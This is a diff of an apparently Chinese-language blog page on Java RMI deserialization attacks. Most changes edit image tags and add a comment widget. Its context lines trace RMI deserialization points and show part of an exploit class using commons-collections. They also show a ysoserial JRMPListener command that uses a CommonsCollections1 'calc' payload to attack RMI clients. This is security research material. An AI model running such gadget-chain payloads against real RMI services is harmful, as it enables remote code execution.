+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png" style="max-width: 100%; height: auto;"></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="nf">lookup</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//创建远程调用对象</span><span class="w">
@@ -543,36 +544,36 @@
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>跟进 <strong>invoke</strong></p>
 <p><strong>super.ref.invoke(var2);</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png" style="max-width: 100%; height: auto;"></p>
 <p>StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法</p>
 <p><strong>executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。</strong></p>
 <p><strong>由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png" style="max-width: 100%; height: auto;"></p>
 <p>这里的 lookup 方法的作用就是去注册中心查找远程对象</p>
 <h3 id="34-客户端-请求服务端">3.4 客户端-请求服务端<a hidden class="anchor" aria-hidden="true" href="#34-客户端-请求服务端">#</a></h3>
 <p><strong>同样注意开启服务端</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png" style="max-width: 100%; height: auto;"></p>
 <p>来到了 invoke</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png" style="max-width: 100%; height: auto;"></p>
 <p>这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png" style="max-width: 100%; height: auto;"></p>
 <p>结束 <!-- raw HTML omitted -->call.executeCall(); 后会出现另一个反序列化点<!-- raw HTML omitted --></p>
 <p>进入 <strong>unmarshalValue</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png" style="max-width: 100%; height: auto;"></p>
 <p><strong>unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据</strong>。</p>
 <ul>
 <li>对基本类型，用专门的 <code>readxxx()</code> 方法读取，再返回</li>
 <li>对对象类型，直接调用 <code>readObject()</code> 反序列化</li>
 </ul>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png" style="max-width: 100%; height: auto;"></p>
 <p>returnValue 返回了 &ldquo;HELLO&rdquo;</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png" style="max-width: 100%; height: auto;"></p>
 <h4 id="总结-客户端产生的反序列化漏洞点">总结-客户端产生的反序列化漏洞点<a hidden class="anchor" aria-hidden="true" href="#总结-客户端产生的反序列化漏洞点">#</a></h4>
 <ol>
 <li>StreamRemoteCall.executeCall</li>
@@ -590,34 +591,34 @@
 <p>前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应</p>
 <blockquote>
 <p>这个线程开启之后等待客户端的连接</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png" style="max-width: 100%; height: auto;"></p>
 </blockquote>
 <p>现在进入创建线程的流程：</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png" style="max-width: 100%; height: auto;"></p>
 <p>进入 run() 后，只能调用 <!-- raw HTML omitted -->executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png" style="max-width: 100%; height: auto;"></p>
 <p>run 调用了 run0</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png" style="max-width: 100%; height: auto;"></p>
 <p>run0 前面都是在解析一些协议，重点是 <strong>handleMessages</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png" style="max-width: 100%; height: auto;"></p>
 <p>其中的 默认情况是调用了 serviceCall</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png" style="max-width: 100%; height: auto;"></p>
 <p>serviceCall 会从表中获取 target</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png" style="max-width: 100%; height: auto;"></p>
 <p>此处断点调试：</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png" style="max-width: 100%; height: auto;"></p>
 <p>可以看到断点处的 stub 就是服务端创建好的东西</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png" style="max-width: 100%; height: auto;"></p>
 <p>之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png" style="max-width: 100%; height: auto;"></p>
 <p>这里 skel 不为空就会调用 oldDispatch</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png" style="max-width: 100%; height: auto;"></p>
 <p><!-- raw HTML omitted -->skel.dispatch<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png" style="max-width: 100%; height: auto;"></p>
 <p>而 <!-- raw HTML omitted -->skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png" style="max-width: 100%; height: auto;"></p>
 <p>接下来就到了重点：</p>
 <p><strong>RegistryImpl_Skel.class</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">dispatch</span><span class="p">(</span><span class="n">Remote</span><span class="w"> </span><span class="n">var1</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">var3</span><span class="p">,</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">var4</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
@@ -740,22 +741,22 @@
 <h3 id="36-服务端-客户端请求时">3.6 服务端-客户端请求时<a hidden class="anchor" aria-hidden="true" href="#36-服务端-客户端请求时">#</a></h3>
 <p>过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。</p>
 <p>图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png" style="max-width: 100%; height: auto;"></p>
 <p>最终拿到的 $Proxy0 是我们需要的动态代理</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png" style="max-width: 100%; height: auto;"></p>
 <p>同样来到 disp.dispatch</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png" style="max-width: 100%; height: auto;"></p>
 <p>不一样的是在 <code>skel != null</code>判断时，此时的 skel 为空，不进入 oldDispatch</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png" style="max-width: 100%; height: auto;"></p>
 <p>继续走，获取远程方法 sayHello</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png" style="max-width: 100%; height: auto;"></p>
 <p>之后会进入 <!-- raw HTML omitted -->unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png" style="max-width: 100%; height: auto;"></p>
 <p>最终在 <code>result = method.invoke(obj, params);</code><!-- raw HTML omitted --> 这一步完成远程调用<!-- raw HTML omitted --></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="37-dgc-客户端请求服务端">3.7 DGC-客户端请求服务端<a hidden class="anchor" aria-hidden="true" href="#37-dgc-客户端请求服务端">#</a></h3>
 <blockquote>
 <p><!-- raw HTML omitted -->分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。<!-- raw HTML omitted --></p>
@@ -1102,7 +1103,7 @@
 </span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
 </span></span></code></pre></div><p><strong>需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。</strong></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png" style="max-width: 100%; height: auto;"></p>
 <p>rebind  和 bind 一样，不再赘述。</p>
 <h4 id="412-lookupunbind">4.1.2 lookup&amp;unbind<a hidden class="anchor" aria-hidden="true" href="#412-lookupunbind">#</a></h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
@@ -1129,7 +1130,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var88</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var88</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png"></p>
+</span></span></span></code></pre></div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png" style="max-width: 100%; height: auto;"></p>
 <p>lookup 只能传入一个 String 类型</p>
 <p>分析 lookup 的功能，然后伪造 lookup 代码，达到目的：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="nf">lookup</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
@@ -1161,8 +1162,8 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">var23</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png"></p>
-<p>调用 invoke 后就到了客户端请求注册中心的流程：<img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png"></p>
+</span></span></span></code></pre></div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png" style="max-width: 100%; height: auto;"></p>
+<p>调用 invoke 后就到了客户端请求注册中心的流程：<img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png" style="max-width: 100%; height: auto;"></p>
 <h5 id="exp-1">EXP：<a hidden class="anchor" aria-hidden="true" href="#exp-1">#</a></h5>
 <p>在 bind 的基础上修改：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.attack</span><span class="p">;</span><span class="w">
@@ -1225,13 +1226,13 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png"></p>
+</span></span></span></code></pre></div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="42-攻击客户端">4.2 攻击客户端<a hidden class="anchor" aria-hidden="true" href="#42-攻击客户端">#</a></h3>
 <h4 id="421-注册中心攻击客户端">4.2.1 注册中心攻击客户端<a hidden class="anchor" aria-hidden="true" href="#421-注册中心攻击客户端">#</a></h4>
 <blockquote>
 <p>除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。</p>
 </blockquote>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png" style="max-width: 100%; height: auto;"></p>
 <p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 'calc'</code></p>
 <p>客户端去访问：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">
@@ -1246,20 +1247,20 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>但是运行完什么都没有发生。。</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png" style="max-width: 100%; height: auto;"></p>
 <h5 id="后续发现俩个问题">后续发现俩个问题，<a hidden class="anchor" aria-hidden="true" href="#后续发现俩个问题">#</a></h5>
 <h6 id="一是-java-版本">一是 Java 版本<a hidden class="anchor" aria-hidden="true" href="#一是-java-版本">#</a></h6>
 <p>如果是用CC1链，Java版本低于 1.8.0_65</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png" style="max-width: 100%; height: auto;"></p>
 <p>当然，高版本可以用 CC6 链绕过也是可以的</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png" style="max-width: 100%; height: auto;"></p>
 <h6 id="二是运行计算器时因为加了-单引号--而找不到程序">二是运行计算器时因为加了 单引号 &rsquo;&rsquo; 而找不到程序<a hidden class="anchor" aria-hidden="true" href="#二是运行计算器时因为加了-单引号--而找不到程序">#</a></h6>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png" style="max-width: 100%; height: auto;"></p>
 <p>运行 <code>calc</code> <code>&quot;calc&quot;</code> 都可以正常弹出</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png"></p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png" style="max-width: 100%; height: auto;"></p>
 <p><strong>根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 <code>'calc'</code>，而不是单纯的 <code>calc</code>。当我们换成 power shell 时，是可以正确执行的。</strong></p>
-<p><img alt="img" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png"></p>
+<p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png" style="max-width: 100%; height: auto;"></p>
 <h4 id="422-服务端攻击客户端">4.2.2 服务端攻击客户端<a hidden class="anchor" aria-hidden="true" href="#422-服务端攻击客户端">#</a></h4>
 <p>服务端攻击客户端，可分俩种情形：</p>
 <ol>
@@ -1353,7 +1354,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user</span><span class="p">.</span><span class="na">getUser</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png"></p>
+</span></span></span></code></pre></div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104061.png" style="max-width: 100%; height: auto;"></p>
 <h5 id="远程加载对象"><!-- raw HTML omitted -->远程加载对象<!-- raw HTML omitted --><a hidden class="anchor" aria-hidden="true" href="#远程加载对象">#</a></h5>
 <blockquote>
 <p>《Java 安全漫谈》</p>
@@ -1380,7 +1381,7 @@
 </blockquote>
 <h3 id="43-攻击服务端">4.3 攻击服务端<a hidden class="anchor" aria-hidden="true" href="#43-攻击服务端">#</a></h3>
 <p>这一部分同样是熟悉的 unmarshalValue ,</p>
-<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png"></p>
+<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242105634.png" style="max-width: 100%; height: auto;"></p>
 <p><strong>服务端调用方法时，存在非基础类型的参数时，就会被恶意 Client 端传入恶意数据触发反序列化</strong></p>
 <h2 id="参考文章">参考文章：<a hidden class="anchor" aria-hidden="true" href="#参考文章">#</a></h2>
 <p>官方文档</p>
@@ -1420,7 +1421,23 @@
   </a>
 </nav>
 
-  </footer>
+  </footer><div class="giscus"></div>
+<script src="https://giscus.app/client.js"
+        data-repo="XVSHIFU/xvsf"
+        data-repo-id="R_kgDOQ6WxXQ"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOQ6WxXc4C1A4B"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="light_protanopia"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
 </article>
     </main>
     
